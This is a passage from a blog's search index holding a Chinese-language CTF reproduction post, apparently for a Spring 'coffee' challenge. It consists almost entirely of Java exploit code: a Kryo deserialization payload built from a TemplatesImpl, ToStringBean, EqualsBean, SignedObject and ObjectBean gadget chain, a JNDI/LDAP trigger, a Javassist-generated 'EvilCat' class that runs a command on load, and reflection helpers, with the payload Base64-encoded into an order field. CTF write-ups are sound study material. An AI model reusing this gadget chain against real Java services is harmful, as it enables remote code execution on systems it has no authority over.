c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="type">byte</span>[] genpayload1()<span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jndiUrl</span> <span class="operator">=</span> <span class="string">&quot;ldap://localhost:1389/obj&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> makeBeanFactoryTriggerBFPA(jndiUrl, makeJNDITrigger(jndiUrl));</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> ( <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(bos) ) &#123;</span><br><span class="line">            <span class="built_in">this</span>.kryo.writeClassAndObject(output, o);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encode(bytes);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] genByteCode() <span class="keyword">throws</span> CannotCompileException, IOException, NotFoundException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;System.out.println(\&quot;whoops!\&quot;);java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); <span class="comment">//设置父类为AbstractTranslet，避免报错</span></span><br><span class="line">        <span class="comment">// 写入.class 文件</span></span><br><span class="line">        <span class="comment">// 将我的恶意类转成字节码，并且反射设置 bytecodes</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">return</span> classBytes;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] genpayload() <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="comment">//        final byte[] bytes1 = ClassPool.getDefault().get(ysoserial.payloads.test2.class.getName()).toBytecode();</span></span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;ClassPool.getDefault().get(MSpringJNIController.class.getName()).toBytecode()&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">item</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, obj);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, item);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,root);</span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">so</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        so = <span class="keyword">new</span> <span class="title class_">SignedObject</span>(badAttributeValueExpException, privateKey, signingEngine);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">delegate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(SignedObject.class, so);</span><br><span class="line">        <span class="type">ObjectBean</span>  <span class="variable">ob</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, delegate);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">o</span> <span class="operator">=</span> makeMap(ob, ob);</span><br><span class="line"><span class="comment">//        ObjectBean delegate = new ObjectBean(Templates.class, obj);</span></span><br><span class="line"><span class="comment">//        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);</span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object, Object&gt; hashmap = makeMap(root,root);</span></span><br><span class="line"><span class="comment">//        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);</span></span><br><span class="line"><span class="comment">//        keyPairGenerator.initialize(1024);</span></span><br><span class="line"><span class="comment">//        KeyPair keyPair = keyPairGenerator.genKeyPair();</span></span><br><span class="line"><span class="comment">//        PrivateKey privateKey = keyPair.getPrivate();</span></span><br><span class="line"><span class="comment">//        Signature signature = Signature.getInstance(privateKey.getAlgorithm());</span></span><br><span class="line"><span class="comment">//        SignedObject signedObject = new SignedObject(hashmap, privateKey, signature);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        ToStringBean item = new ToStringBean(SignedObject.class, signedObject);</span></span><br><span class="line"><span class="comment">//        EqualsBean root1 = new EqualsBean(ToStringBean.class, item);</span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object, Object&gt; hashmap1 = makeMap(root1,root1);</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">try</span> ( <span class="type">Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Output</span>(bos) ) &#123;</span><br><span class="line">            <span class="built_in">this</span>.kryo.writeClassAndObject(output, o);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encode(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Main</span> <span class="variable">main</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">        main.demoFlavor(<span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;polish\&quot;:True,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;References\&quot;:True,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;RegistrationRequired\&quot;:False,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;InstantiatorStrategy\&quot;:\&quot;org.objenesis.strategy.StdInstantiatorStrategy\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = main.genpayload();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytes);</span><br><span class="line">        <span class="type">CoffeeRequest</span> <span class="variable">coffee</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CoffeeRequest</span>();</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>(coffee);</span><br><span class="line">        coffee.setExtraFlavor(s);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(bytes));</span><br><span class="line"><span class="comment">//        main.order(coffee);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>util</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mrtf.springcoffee.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( <span class="string">&quot;restriction&quot;</span> )</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Reflections</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span> <span class="params">( <span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">            <span class="keyword">if</span> ( field != <span class="literal">null</span> )</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( clazz.getSuperclass() != <span class="literal">null</span> )</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( NoSuchFieldException e ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !clazz.getSuperclass().equals(Object.class) ) &#123;</span><br><span class="line">                <span class="keyword">return</span> getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">( <span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span> <span class="params">( <span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Constructor&lt;?&gt; getFirstCtor ( <span class="keyword">final</span> String name ) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[ <span class="number">0</span> ];</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> ctor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">            <span class="string">&quot;unchecked&quot;</span></span><br><span class="line">    &#125; )</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes,</span></span><br><span class="line"><span class="params">                                                Object[] consArgs )</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全, CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
